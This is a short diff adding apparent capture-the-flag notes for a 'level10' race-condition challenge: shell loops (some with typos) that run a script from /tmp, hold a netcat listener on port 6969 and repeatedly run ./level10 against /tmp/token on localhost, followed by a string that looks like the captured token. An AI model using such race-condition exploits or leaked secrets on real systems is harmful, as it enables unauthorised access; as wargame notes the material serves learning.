@@ -1,0 +1,5 @@
+race condition
+whlie true; do /tmp/script; done
+while true do; nc -l 6969; done
+while true do; ./level10 /tmp/token 127.0.0.1; done
+woupa2yuojeeaaed06riuj63c
